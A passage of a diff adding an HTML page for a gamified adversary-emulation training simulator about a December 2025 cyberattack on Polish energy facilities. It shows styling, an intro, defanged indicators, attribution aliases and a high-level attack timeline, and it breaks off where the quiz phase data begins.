@@ -1,0 +1,1759 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OPERATION WINTER STORM — Adversary Emulation Simulator</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500;600&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #030810;
+    --panel: #070f1e;
+    --border: #0d2040;
+    --accent: #b44fff;
+    --accent2: #ff3366;
+    --accent3: #39ff14;
+    --warn: #ff9800;
+    --neutral: #1a3050;
+    --text: #a8c8e8;
+    --text-bright: #e0f0ff;
+    --dim: #3a5570;
+    --red-zone: #ff1744;
+    --success: #00e676;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Inter', sans-serif;
+    min-height: 100vh;
+    overflow-x: hidden;
+    cursor: crosshair;
+  }
+
+  /* Scanline overlay */
+  body::after {
+    content: '';
+    position: fixed; inset: 0;
+    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(180,79,255,0.015) 2px, rgba(180,79,255,0.015) 4px);
+    pointer-events: none; z-index: 9999;
+  }
+
+  /* Animated background grid */
+  .grid-bg {
+    position: fixed; inset: 0; z-index: 0;
+    background-image:
+      linear-gradient(rgba(180,79,255,0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(180,79,255,0.03) 1px, transparent 1px);
+    background-size: 40px 40px;
+    animation: gridPulse 8s ease-in-out infinite;
+  }
+  @keyframes gridPulse { 0%,100%{opacity:.5} 50%{opacity:1} }
+
+  #app { position: relative; z-index: 1; }
+
+  /* ══ HEADER ══ */
+  .header {
+    border-bottom: 1px solid var(--border);
+    padding: 16px 30px;
+    display: flex; align-items: center; justify-content: space-between;
+    background: rgba(7,15,30,0.9);
+    backdrop-filter: blur(10px);
+    position: sticky; top: 0; z-index: 100;
+  }
+  .header-logo {
+    font-family: 'Orbitron', sans-serif;
+    font-size: 13px; font-weight: 900;
+    color: var(--accent2);
+    letter-spacing: 4px;
+    text-transform: uppercase;
+  }
+  .header-logo span { color: var(--accent); }
+  .header-status {
+    display: flex; gap: 20px; align-items: center;
+    font-size: 11px; color: var(--dim);
+  }
+  .status-dot {
+    width: 6px; height: 6px; border-radius: 50%;
+    background: var(--accent3);
+    animation: blink 1.5s infinite;
+    display: inline-block; margin-right: 5px;
+  }
+  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
+
+  /* ══ SCREEN MANAGER ══ */
+  .screen { display: none; }
+  .screen.active { display: block; }
+  #game.active { display: grid; }
+  #intro.active { display: flex; }
+  #outcome.active { display: flex; }
+
+  /* ══ INTRO SCREEN ══ */
+  #intro {
+    min-height: 100vh;
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    padding: 40px 20px;
+    text-align: center;
+  }
+  .intro-badge {
+    font-size: 10px; letter-spacing: 5px; color: var(--accent2);
+    text-transform: uppercase; margin-bottom: 20px;
+    padding: 6px 16px; border: 1px solid var(--accent2);
+    display: inline-block;
+    animation: fadeInDown 0.8s ease;
+  }
+  .intro-title {
+    font-family: 'Orbitron', sans-serif;
+    font-size: clamp(28px, 6vw, 64px);
+    font-weight: 900;
+    color: var(--text-bright);
+    line-height: 1.1;
+    margin-bottom: 12px;
+    text-shadow: 0 0 40px rgba(180,79,255,0.3);
+    animation: fadeInDown 0.8s ease 0.1s both;
+  }
+  .intro-title .accent { color: var(--accent); }
+  .intro-subtitle {
+    font-size: 13px; color: var(--dim);
+    margin-bottom: 8px; letter-spacing: 2px;
+    animation: fadeInDown 0.8s ease 0.2s both;
+  }
+  .intro-date {
+    font-size: 11px; color: var(--accent2);
+    margin-bottom: 40px; letter-spacing: 3px;
+    animation: fadeInDown 0.8s ease 0.3s both;
+  }
+  .intro-desc {
+    max-width: 700px; font-size: 13px; line-height: 1.8;
+    color: var(--text); margin-bottom: 50px;
+    animation: fadeInDown 0.8s ease 0.4s both;
+  }
+  .intro-stats {
+    display: flex; gap: 30px; flex-wrap: wrap; justify-content: center;
+    margin-bottom: 50px;
+    animation: fadeInDown 0.8s ease 0.5s both;
+  }
+  .stat-card {
+    border: 1px solid var(--border);
+    padding: 16px 24px; text-align: center;
+    background: var(--panel);
+    position: relative; overflow: hidden;
+  }
+  .stat-card::before {
+    content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px;
+    background: var(--accent);
+  }
+  .stat-num { font-family: 'Orbitron', sans-serif; font-size: 28px; color: var(--accent); font-weight: 700; }
+  .stat-label { font-size: 10px; color: var(--dim); letter-spacing: 2px; margin-top: 4px; }
+
+  .btn-primary {
+    padding: 14px 40px;
+    background: transparent; border: 1px solid var(--accent);
+    color: var(--accent); font-family: 'Orbitron', sans-serif;
+    font-size: 13px; font-weight: 700; letter-spacing: 4px;
+    text-transform: uppercase; cursor: pointer;
+    position: relative; overflow: hidden;
+    transition: all 0.3s;
+    animation: fadeInDown 0.8s ease 0.6s both;
+  }
+  .btn-primary::before {
+    content: ''; position: absolute; inset: 0;
+    background: var(--accent); transform: translateX(-100%);
+    transition: transform 0.3s;
+  }
+  .btn-primary:hover { color: var(--bg); }
+  .btn-primary:hover::before { transform: translateX(0); }
+  .btn-primary span { position: relative; z-index: 1; }
+
+  @keyframes fadeInDown { from{opacity:0;transform:translateY(-20px)} to{opacity:1;transform:translateY(0)} }
+
+  /* Completion modal (inline, after last phase answer) */
+  .completion-modal {
+    margin-top: 24px;
+    animation: fadeInDown 0.5s ease;
+  }
+  .completion-modal-inner {
+    border: 1px solid var(--accent);
+    background: rgba(180,79,255,0.05);
+    padding: 28px 28px 20px;
+    display: flex; flex-direction: column; align-items: center; text-align: center;
+  }
+  .completion-icon { font-size: 36px; margin-bottom: 10px; }
+  .completion-headline {
+    font-family: 'Orbitron', sans-serif; font-size: 18px; font-weight: 900;
+    color: var(--text-bright); margin-bottom: 8px; letter-spacing: 2px;
+  }
+  .completion-sub { font-size: 12px; color: var(--dim); line-height: 1.8; margin-bottom: 22px; }
+  .completion-score-row {
+    display: flex; align-items: center; gap: 10px;
+    margin-bottom: 24px;
+    border: 1px solid var(--border); padding: 14px 28px;
+    background: var(--bg);
+  }
+  .completion-score-item { text-align: center; }
+  .completion-score-val { font-family: 'Orbitron', sans-serif; font-size: 28px; font-weight: 900; }
+  .completion-score-lbl { font-size: 9px; color: var(--dim); letter-spacing: 2px; margin-top: 2px; }
+  .completion-score-sep { font-size: 24px; color: var(--dim); padding: 0 8px; }
+  .completion-name-row {
+    display: flex; gap: 10px; width: 100%; max-width: 480px; margin-bottom: 4px;
+  }
+
+  /* ══ MAIN GAME LAYOUT ══ */
+  #game {
+    min-height: calc(100vh - 60px);
+    display: grid;
+    grid-template-columns: 280px 1fr 300px;
+    grid-template-rows: auto 1fr;
+    gap: 0;
+  }
+
+  /* Progress bar */
+  .progress-bar-outer {
+    grid-column: 1 / -1;
+    background: var(--panel);
+    border-bottom: 1px solid var(--border);
+    padding: 12px 20px;
+    display: flex; align-items: center; gap: 20px;
+  }
+  .phase-label { font-family: 'Orbitron', sans-serif; font-size: 10px; color: var(--accent2); letter-spacing: 2px; white-space: nowrap; }
+  .progress-track { flex: 1; height: 4px; background: var(--border); position: relative; }
+  .progress-fill { height: 100%; background: linear-gradient(90deg, var(--accent2), var(--accent)); transition: width 0.8s ease; }
+  .phase-count { font-size: 11px; color: var(--dim); white-space: nowrap; }
+
+  /* LEFT: Attack Chain Nav */
+  .attack-chain {
+    border-right: 1px solid var(--border);
+    background: var(--panel);
+    padding: 20px 0;
+    overflow-y: auto;
+    height: calc(100vh - 60px - 46px);
+  }
+  .chain-title {
+    font-family: 'Orbitron', sans-serif;
+    font-size: 9px; color: var(--dim); letter-spacing: 3px;
+    padding: 0 20px 12px; text-transform: uppercase;
+    border-bottom: 1px solid var(--border); margin-bottom: 10px;
+  }
+  .chain-phase {
+    padding: 12px 20px;
+    cursor: pointer;
+    border-left: 3px solid transparent;
+    transition: all 0.2s;
+    position: relative;
+  }
+  .chain-phase:hover { background: rgba(180,79,255,0.05); }
+  .chain-phase.active { border-left-color: var(--accent); background: rgba(180,79,255,0.08); }
+  .chain-phase.completed { border-left-color: var(--accent3); }
+  .chain-phase.locked { opacity: 0.35; cursor: not-allowed; }
+  .phase-num { font-size: 9px; color: var(--dim); letter-spacing: 2px; margin-bottom: 3px; }
+  .phase-name { font-size: 12px; color: var(--text-bright); font-weight: 600; }
+  .phase-tactic { font-size: 10px; color: var(--dim); margin-top: 2px; }
+  .phase-icon { position: absolute; right: 16px; top: 50%; transform: translateY(-50%); font-size: 14px; }
+  .chain-connector {
+    margin: 0 29px; width: 1px; height: 12px;
+    background: linear-gradient(var(--dim), transparent);
+  }
+
+  /* CENTER: Main content */
+  .main-content {
+    overflow-y: auto;
+    height: calc(100vh - 60px - 46px);
+    padding: 30px;
+  }
+
+  .phase-card {
+    border: 1px solid var(--border);
+    background: var(--panel);
+    margin-bottom: 20px;
+  }
+  .phase-card-header {
+    padding: 16px 20px;
+    background: rgba(180,79,255,0.05);
+    border-bottom: 1px solid var(--border);
+    display: flex; align-items: center; gap: 14px;
+  }
+  .phase-card-badge {
+    font-family: 'Orbitron', sans-serif;
+    font-size: 9px; font-weight: 700; letter-spacing: 3px;
+    padding: 4px 10px; border: 1px solid;
+    text-transform: uppercase;
+  }
+  .badge-red { color: var(--accent2); border-color: var(--accent2); background: rgba(255,51,102,0.1); }
+  .badge-blue { color: var(--accent); border-color: var(--accent); background: rgba(180,79,255,0.1); }
+  .badge-green { color: var(--accent3); border-color: var(--accent3); background: rgba(57,255,20,0.1); }
+  .badge-orange { color: var(--warn); border-color: var(--warn); background: rgba(255,152,0,0.1); }
+  .phase-card-title { font-family: 'Orbitron', sans-serif; font-size: 14px; color: var(--text-bright); font-weight: 700; }
+
+  .phase-card-body { padding: 20px; }
+  .narrative { font-size: 13px; line-height: 1.9; color: var(--text); margin-bottom: 20px; }
+  .narrative strong { color: var(--accent); }
+
+  /* Code blocks */
+  .code-block {
+    background: #010509;
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--accent2);
+    padding: 14px 16px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    color: var(--accent3);
+    margin: 14px 0;
+    overflow-x: auto;
+    position: relative;
+  }
+  .code-block .code-label {
+    position: absolute; top: 6px; right: 10px;
+    font-size: 9px; color: var(--dim); letter-spacing: 2px;
+  }
+  .code-block .cmd { color: #e0e; }
+  .code-block .str { color: #fc6; }
+  .code-block .num { color: var(--accent); }
+  .code-block .com { color: var(--dim); }
+
+  /* MITRE tags */
+  .mitre-tags { display: flex; flex-wrap: wrap; gap: 8px; margin: 14px 0; }
+  .mitre-tag {
+    font-size: 10px; padding: 3px 10px;
+    border: 1px solid var(--neutral);
+    color: var(--dim); letter-spacing: 1px;
+    background: rgba(26,48,80,0.5);
+  }
+  .mitre-tag .tid { color: var(--warn); }
+
+  /* Choices / Quiz */
+  .challenge-box {
+    border: 1px solid var(--accent2);
+    background: rgba(255,51,102,0.05);
+    padding: 20px;
+    margin-top: 20px;
+  }
+  .challenge-title {
+    font-family: 'Orbitron', sans-serif;
+    font-size: 11px; color: var(--accent2); letter-spacing: 3px;
+    margin-bottom: 14px; text-transform: uppercase;
+  }
+  .challenge-q { font-size: 13px; color: var(--text-bright); margin-bottom: 16px; line-height: 1.7; }
+  .choice-grid { display: flex; flex-direction: column; gap: 8px; }
+  .choice-btn {
+    padding: 12px 16px;
+    background: var(--bg); border: 1px solid var(--border);
+    color: var(--text); font-family: 'Inter', sans-serif;
+    font-size: 12px; text-align: left; cursor: pointer;
+    transition: all 0.2s; display: flex; align-items: center; gap: 12px;
+  }
+  .choice-btn:hover:not(.answered) { border-color: var(--accent); color: var(--accent); background: rgba(180,79,255,0.05); }
+  .choice-btn.correct { border-color: var(--success); color: var(--success); background: rgba(0,230,118,0.08); }
+  .choice-btn.incorrect { border-color: var(--accent2); color: var(--accent2); background: rgba(255,23,68,0.08); }
+  .choice-letter {
+    font-family: 'Orbitron', sans-serif; font-size: 10px;
+    width: 22px; height: 22px; border: 1px solid;
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0;
+  }
+  .feedback-box {
+    margin-top: 14px; padding: 14px 16px;
+    border-left: 3px solid var(--success);
+    background: rgba(0,230,118,0.05);
+    font-size: 12px; line-height: 1.8; display: none;
+  }
+  .feedback-box.show { display: block; }
+  .feedback-box.fail { border-left-color: var(--accent2); background: rgba(255,23,68,0.05); }
+
+  /* Next phase btn */
+  .next-btn {
+    margin-top: 20px; padding: 11px 28px;
+    background: transparent; border: 1px solid var(--accent3);
+    color: var(--accent3); font-family: 'Orbitron', sans-serif;
+    font-size: 10px; letter-spacing: 3px; cursor: pointer;
+    text-transform: uppercase; display: none; transition: all 0.2s;
+  }
+  .next-btn.show { display: inline-flex; align-items: center; gap: 8px; }
+  .next-btn:hover { background: var(--accent3); color: var(--bg); }
+
+  /* Defender Tips */
+  .defender-card {
+    border: 1px solid #0d3020;
+    background: rgba(0,230,118,0.03);
+    padding: 14px 16px; margin-top: 14px;
+    position: relative;
+  }
+  .defender-card::before {
+    content: '🛡 DEFENDER NOTE'; position: absolute;
+    top: -8px; left: 14px; background: var(--panel);
+    padding: 0 8px; font-size: 9px; color: var(--success); letter-spacing: 2px;
+  }
+  .defender-text { font-size: 12px; color: var(--text); line-height: 1.8; margin-top: 6px; }
+
+  /* RIGHT PANEL: Scoreboard & Maturity */
+  .side-panel {
+    border-left: 1px solid var(--border);
+    background: var(--panel);
+    padding: 20px;
+    overflow-y: auto;
+    height: calc(100vh - 60px - 46px);
+  }
+  .panel-section { margin-bottom: 24px; }
+  .panel-title {
+    font-family: 'Orbitron', sans-serif; font-size: 9px;
+    color: var(--dim); letter-spacing: 3px; text-transform: uppercase;
+    border-bottom: 1px solid var(--border); padding-bottom: 8px; margin-bottom: 12px;
+  }
+
+  /* Score */
+  .score-display {
+    text-align: center; padding: 14px;
+    border: 1px solid var(--border);
+    background: var(--bg); margin-bottom: 12px;
+  }
+  .score-num { font-family: 'Orbitron', sans-serif; font-size: 36px; color: var(--accent); font-weight: 900; }
+  .score-label { font-size: 9px; color: var(--dim); letter-spacing: 2px; margin-top: 4px; }
+
+  /* Maturity meters */
+  .maturity-item { margin-bottom: 12px; }
+  .mat-label { font-size: 10px; color: var(--text); display: flex; justify-content: space-between; margin-bottom: 5px; }
+  .mat-bar { height: 4px; background: var(--border); }
+  .mat-fill { height: 100%; transition: width 1s ease; }
+  .mat-bad .mat-fill { background: var(--accent2); }
+  .mat-med .mat-fill { background: var(--warn); }
+  .mat-good .mat-fill { background: var(--accent3); }
+
+  /* IOC feed */
+  .ioc-feed {
+    max-height: 200px; overflow-y: auto;
+    border: 1px solid var(--border); background: var(--bg);
+    padding: 8px;
+  }
+  .ioc-item {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 10px; color: var(--dim);
+    padding: 3px 0; border-bottom: 1px solid #0a1020;
+    display: flex; align-items: center; gap: 8px;
+  }
+  .ioc-item:last-child { border-bottom: none; }
+  .ioc-dot { width: 5px; height: 5px; border-radius: 50%; flex-shrink: 0; }
+  .ioc-red { background: var(--accent2); }
+  .ioc-orange { background: var(--warn); }
+  .ioc-cyan { background: var(--accent); }
+  .ioc-val { color: var(--text); word-break: break-all; }
+
+  /* ATTRIBUTION MAP */
+  .attrib-box {
+    border: 1px solid var(--border); background: var(--bg); padding: 12px;
+  }
+  .attrib-name { font-family: 'Orbitron', sans-serif; font-size: 12px; color: var(--warn); margin-bottom: 8px; }
+  .attrib-alias { font-size: 10px; color: var(--dim); line-height: 1.7; }
+  .attrib-alias span { color: var(--text); }
+
+  /* OUTCOME SCREEN */
+  #outcome {
+    min-height: 100vh;
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    padding: 40px 20px; text-align: center;
+  }
+  .outcome-title {
+    font-family: 'Orbitron', sans-serif;
+    font-size: clamp(24px, 5vw, 52px); font-weight: 900;
+    margin-bottom: 16px; text-shadow: 0 0 40px currentColor;
+  }
+  .outcome-sub { font-size: 14px; color: var(--dim); margin-bottom: 40px; letter-spacing: 2px; }
+  .outcome-score {
+    font-family: 'Orbitron', sans-serif; font-size: 80px; font-weight: 900;
+    color: var(--accent); margin-bottom: 8px;
+    text-shadow: 0 0 60px rgba(180,79,255,0.4);
+  }
+  .outcome-max { font-size: 14px; color: var(--dim); margin-bottom: 40px; }
+
+  .maturity-report {
+    display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+    gap: 16px; max-width: 800px; margin: 0 auto 40px; text-align: left;
+  }
+  .report-card {
+    border: 1px solid var(--border); padding: 16px;
+    background: var(--panel);
+  }
+  .report-card-title { font-size: 10px; color: var(--dim); letter-spacing: 2px; margin-bottom: 8px; }
+  .report-card-val { font-family: 'Orbitron', sans-serif; font-size: 22px; font-weight: 700; }
+  .val-red { color: var(--accent2); }
+  .val-orange { color: var(--warn); }
+  .val-green { color: var(--accent3); }
+
+  /* Timeline bar in outcome */
+  .timeline { max-width: 800px; margin: 0 auto 40px; text-align: left; }
+  .tl-item { display: flex; gap: 16px; margin-bottom: 14px; align-items: flex-start; }
+  .tl-dot { width: 10px; height: 10px; border-radius: 50%; margin-top: 4px; flex-shrink: 0; }
+  .tl-content { font-size: 12px; line-height: 1.7; }
+  .tl-time { color: var(--dim); font-size: 10px; letter-spacing: 1px; margin-bottom: 2px; }
+  .tl-desc { color: var(--text); }
+
+  /* Scrollbar */
+  ::-webkit-scrollbar { width: 4px; height: 4px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--neutral); }
+
+  /* Glitch animation */
+  @keyframes glitch {
+    0%,100%{clip-path:inset(0)} 10%{clip-path:inset(10% 0 80% 0);transform:translate(-2px)} 
+    20%{clip-path:inset(40% 0 40% 0);transform:translate(2px)} 
+    30%{clip-path:inset(70% 0 20% 0);transform:translate(-1px)} 
+    40%{clip-path:inset(0)} 50%{clip-path:inset(50% 0 30% 0);transform:translate(1px)}
+  }
+
+  .terminal-typing::after { content: '█'; animation: blink 1s infinite; }
+
+  .highlight-red { color: var(--accent2); }
+  .highlight-cyan { color: var(--accent); }
+  .highlight-green { color: var(--accent3); }
+  .highlight-warn { color: var(--warn); }
+
+  @media (max-width: 1100px) {
+    #game { grid-template-columns: 240px 1fr; }
+    .side-panel { display: none; }
+  }
+  @media (max-width: 768px) {
+    #game { grid-template-columns: 1fr; }
+    .attack-chain { display: none; }
+  }
+</style>
+</head>
+<body>
+<div class="grid-bg"></div>
+<div id="app">
+
+<!-- ══ HEADER ══ -->
+<div class="header">
+  <div class="header-logo">HARDHAT <span>// ADVERSARY EMULATION PLATFORM</span></div>
+  <div class="header-status">
+    <span><span class="status-dot"></span>LIVE SIMULATION</span>
+    <span id="header-score" style="color:var(--accent)">SCORE: 0</span>
+    <span id="header-phase" style="color:var(--dim)">PHASE: —</span>
+  </div>
+</div>
+
+<!-- ══ INTRO SCREEN ══ -->
+<div id="intro" class="screen active">
+  <div class="intro-badge">⚠ CLASSIFIED SIMULATION ENVIRONMENT</div>
+  <div class="intro-title">OPERATION<br><span class="accent">WINTER STORM</span></div>
+  <div class="intro-subtitle">Poland Energy Sector Attack — Adversary Emulation Simulator</div>
+  <div class="intro-date">29 DECEMBER 2025 &nbsp;|&nbsp; ATTRIBUTION: BERSERK BEAR / STATIC TUNDRA</div>
+  <div class="intro-desc">
+    On 29 December 2025, during snowstorms and subzero temperatures, coordinated cyberattacks struck Poland's energy infrastructure — 
+    wind farms, solar plants, a CHP plant serving <strong style="color:var(--accent)">500,000 people</strong>, and a manufacturing company. 
+    Walk through the complete attack chain across this adversary emulation simulation. At each phase, test your detection & response knowledge. 
+    Your score measures your organization's <strong style="color:var(--accent2)">cyber maturity</strong>.
+  </div>
+  <div class="intro-stats">
+    <div class="stat-card"><div class="stat-num">30+</div><div class="stat-label">Wind & Solar Farms Hit</div></div>
+    <div class="stat-card"><div class="stat-num">500K</div><div class="stat-label">Heating Customers at Risk</div></div>
+    <div class="stat-card"><div class="stat-num">9</div><div class="stat-label">Attack Phases</div></div>
+    <div class="stat-card"><div class="stat-num">2</div><div class="stat-label">Custom Wipers Deployed</div></div>
+  </div>
+  <button class="btn-primary" onclick="startGame()"><span>▶ BEGIN SIMULATION</span></button>
+</div>
+
+<!-- ══ GAME SCREEN ══ -->
+<div id="game" class="screen">
+  <div class="progress-bar-outer">
+    <div class="phase-label" id="current-phase-label">PHASE 1/9</div>
+    <div class="progress-track"><div class="progress-fill" id="progress-fill" style="width:0%"></div></div>
+    <div class="phase-count" id="progress-text">0% COMPLETE</div>
+  </div>
+
+  <!-- LEFT NAV -->
+  <div class="attack-chain">
+    <div class="chain-title">ATTACK CHAIN</div>
+    <div id="chain-nav"></div>
+  </div>
+
+  <!-- CENTER -->
+  <div class="main-content" id="main-content"></div>
+
+  <!-- RIGHT PANEL -->
+  <div class="side-panel">
+    <div class="panel-section">
+      <div class="panel-title">OPERATOR SCORE</div>
+      <div class="score-display">
+        <div class="score-num" id="score-display">0</div>
+        <div class="score-label">MATURITY POINTS</div>
+      </div>
+    </div>
+
+    <div class="panel-section">
+      <div class="panel-title">SECURITY POSTURE</div>
+      <div id="maturity-meters">
+        <div class="maturity-item">
+          <div class="mat-label"><span>Patch Management</span><span id="mat-patch">10%</span></div>
+          <div class="mat-bar mat-bad"><div class="mat-fill" id="fill-patch" style="width:10%"></div></div>
+        </div>
+        <div class="maturity-item">
+          <div class="mat-label"><span>Credential Hygiene</span><span id="mat-cred">5%</span></div>
+          <div class="mat-bar mat-bad"><div class="mat-fill" id="fill-cred" style="width:5%"></div></div>
+        </div>
+        <div class="maturity-item">
+          <div class="mat-label"><span>MFA Coverage</span><span id="mat-mfa">0%</span></div>
+          <div class="mat-bar mat-bad"><div class="mat-fill" id="fill-mfa" style="width:0%"></div></div>
+        </div>
+        <div class="maturity-item">
+          <div class="mat-label"><span>Network Segmentation</span><span id="mat-net">20%</span></div>
+          <div class="mat-bar mat-bad"><div class="mat-fill" id="fill-net" style="width:20%"></div></div>
+        </div>
+        <div class="maturity-item">
+          <div class="mat-label"><span>EDR/Detection</span><span id="mat-edr">30%</span></div>
+          <div class="mat-bar mat-med"><div class="mat-fill" id="fill-edr" style="width:30%"></div></div>
+        </div>
+        <div class="maturity-item">
+          <div class="mat-label"><span>Incident Response</span><span id="mat-ir">15%</span></div>
+          <div class="mat-bar mat-bad"><div class="mat-fill" id="fill-ir" style="width:15%"></div></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-section">
+      <div class="panel-title">LIVE IOC FEED</div>
+      <div class="ioc-feed" id="ioc-feed">
+        <div class="ioc-item"><div class="ioc-dot ioc-cyan"></div><span class="ioc-val">185.200.177[.]10</span></div>
+        <div class="ioc-item"><div class="ioc-dot ioc-red"></div><span class="ioc-val">31.172.71[.]5</span></div>
+        <div class="ioc-item"><div class="ioc-dot ioc-orange"></div><span class="ioc-val">FortiGate SSL-VPN</span></div>
+        <div class="ioc-item"><div class="ioc-dot ioc-cyan"></div><span class="ioc-val">KB284726.ps1</span></div>
+        <div class="ioc-item"><div class="ioc-dot ioc-red"></div><span class="ioc-val">DynoWiper / Source.exe</span></div>
+        <div class="ioc-item"><div class="ioc-dot ioc-orange"></div><span class="ioc-val">Custom GPO Task</span></div>
+        <div class="ioc-item"><div class="ioc-dot ioc-red"></div><span class="ioc-val">C:\Users\vagrant\ (PDB)</span></div>
+      </div>
+    </div>
+
+    <div class="panel-section">
+      <div class="panel-title">ATTRIBUTION</div>
+      <div class="attrib-box">
+        <div class="attrib-name">⚡ BERSERK BEAR</div>
+        <div class="attrib-alias">
+          CrowdStrike: <span>Berserk Bear</span><br>
+          Microsoft: <span>Ghost Blizzard</span><br>
+          Cisco: <span>Static Tundra</span><br>
+          Symantec: <span>Dragonfly</span><br>
+          Focus: <span>Energy / ICS Sectors</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ══ BADGE OVERLAY MODAL ══ -->
+<div id="badge-overlay" style="display:none;position:fixed;inset:0;z-index:500;
+  background:rgba(3,8,16,0.92);backdrop-filter:blur(8px);
+  display:none;align-items:center;justify-content:center;padding:20px;">
+  <div style="background:var(--panel);border:1px solid var(--border);max-width:760px;width:100%;padding:32px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:24px;">
+      <div style="font-family:'Orbitron',sans-serif;font-size:10px;color:var(--accent);letter-spacing:3px;">YOUR ACHIEVEMENT BADGE</div>
+      <button onclick="closeBadgeModal()" style="background:none;border:none;color:var(--dim);font-size:20px;cursor:pointer;line-height:1;">×</button>
+    </div>
+    <canvas id="badge-canvas" width="700" height="380"
+      style="max-width:100%;display:block;margin:0 auto 24px;"></canvas>
+    <div style="display:flex;gap:12px;justify-content:center;flex-wrap:wrap;">
+      <button class="btn-primary" onclick="downloadBadge()" style="border-color:var(--accent3);color:var(--accent3)"><span>⬇ DOWNLOAD BADGE</span></button>
+      <button class="btn-primary" onclick="shareLinkedIn()" style="border-color:#0a66c2;color:#0a66c2;">
+        <span style="display:flex;align-items:center;gap:8px;">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="#0a66c2"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
+          SHARE ON LINKEDIN
+        </span>
+      </button>
+      <button class="btn-primary" onclick="closeBadgeModal();showOutcome();" style="border-color:var(--dim);color:var(--dim);"><span>VIEW FULL DEBRIEF →</span></button>
+    </div>
+  </div>
+</div>
+
+<!-- ══ OUTCOME SCREEN ══ -->
+<div id="outcome" class="screen">
+  <div class="intro-badge">SIMULATION COMPLETE</div>
+  <div class="outcome-title" id="outcome-title" style="color: var(--accent)">MISSION DEBRIEF</div>
+  <div class="outcome-sub" id="outcome-grade">CYBER MATURITY ASSESSMENT</div>
+  <div class="outcome-score" id="final-score">0</div>
+  <div class="outcome-max" id="final-max">/ 900 POSSIBLE POINTS</div>
+
+  <div class="maturity-report" id="maturity-report"></div>
+
+  <div style="max-width:700px;margin:0 auto 30px;font-size:12px;line-height:1.9;color:var(--text);text-align:left;border:1px solid var(--border);padding:20px;background:var(--panel)">
+    <div style="font-family:'Orbitron',sans-serif;font-size:9px;color:var(--accent2);letter-spacing:3px;margin-bottom:12px">ATTACK CHAIN TIMELINE</div>
+    <div class="timeline">
+      <div class="tl-item"><div class="tl-dot" style="background:var(--warn)"></div><div class="tl-content"><div class="tl-time">MAR–JUL 2025</div><div class="tl-desc">Initial compromise of CHP plant via FortiGate SSL-VPN. Reconnaissance of SCADA systems over months.</div></div></div>
+      <div class="tl-item"><div class="tl-dot" style="background:var(--warn)"></div><div class="tl-content"><div class="tl-time">25 DEC 2025</div><div class="tl-desc">Attacker scans Mikronika RTU devices at all renewable energy farms. Pre-attack reconnaissance.</div></div></div>
+      <div class="tl-item"><div class="tl-dot" style="background:var(--warn)"></div><div class="tl-content"><div class="tl-time">26 DEC 2025</div><div class="tl-desc">DynoWiper compiled (13:51 UTC). HMI machines prepared with SMB admin shares via PowerShell.</div></div></div>
+      <div class="tl-item"><div class="tl-dot" style="background:var(--accent2)"></div><div class="tl-content"><div class="tl-time">29 DEC 2025, MORNING</div><div class="tl-desc">Simultaneous destructive attacks: corrupted RTU firmware, deleted Mikronika files, factory-reset FortiGate + Moxa devices.</div></div></div>
+      <div class="tl-item"><div class="tl-dot" style="background:var(--accent2)"></div><div class="tl-content"><div class="tl-time">29 DEC 2025, 13:17–14:10</div><div class="tl-desc">Two DynoWiper variants compiled and deployed via GPO at CHP plant. EDR blocked execution via canary files.</div></div></div>
+      <div class="tl-item"><div class="tl-dot" style="background:var(--accent3)"></div><div class="tl-content"><div class="tl-time">OUTCOME</div><div class="tl-desc">CHP plant: EDR saved 100+ machines. Renewable farms: RTU/relay damage caused DSO communication loss. Manufacturing: LazyWiper partially deployed.</div></div></div>
+    </div>
+  </div>
+
+  <!-- BADGE RE-SHARE on outcome screen -->
+  <div id="badge-section" style="margin-bottom:32px;text-align:center;">
+    <button class="btn-primary" onclick="openBadgeFromOutcome()" style="border-color:var(--accent);color:var(--accent);padding:14px 36px;">
+      <span style="display:flex;align-items:center;gap:10px;">
+        🏅 VIEW & SHARE YOUR BADGE
+      </span>
+    </button>
+  </div>
+
+  <button class="btn-primary" onclick="restartGame()" style="margin-right:20px"><span>↺ RESTART SIMULATION</span></button>
+  <button class="btn-primary" onclick="window.open('https://hardhatsecurity.com','_blank')" style="border-color:var(--dim)"><span>↗ HARDHATSECURITY.COM</span></button>
+</div>
+
+</div><!-- #app -->
+
+<script>
+// ═══════════════════════════════════════════════════════════════
+// GAME DATA
+// ═══════════════════════════════════════════════════════════════
+const phases = [
+  {
+    id: 0,
+    name: "Initial Access",
+    tactic: "T1133 — External Remote Services",
+    icon: "🔓",
+    badge: "badge-red",
+    badgeText: "ATT&CK T1133",
